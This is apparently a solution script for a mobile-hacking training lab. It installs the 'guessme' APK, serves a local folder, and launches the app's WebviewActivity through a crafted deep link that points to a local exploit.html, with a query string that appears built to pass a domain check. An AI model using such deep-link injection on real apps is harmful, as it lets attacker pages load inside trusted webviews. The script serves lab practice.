adb install com.mobilehackinglab.guessme.apk
python3 -m http.server 8080 -d http_server &> /dev/null &
adb shell 'am start -n com.mobilehackinglab.guessme/.WebviewActivity -a android.intent.action.VIEW -d mhl://mobilehackinglab?url=http://10.0.2.2:8080/exploit.html?x=mobilehackinglab.com'

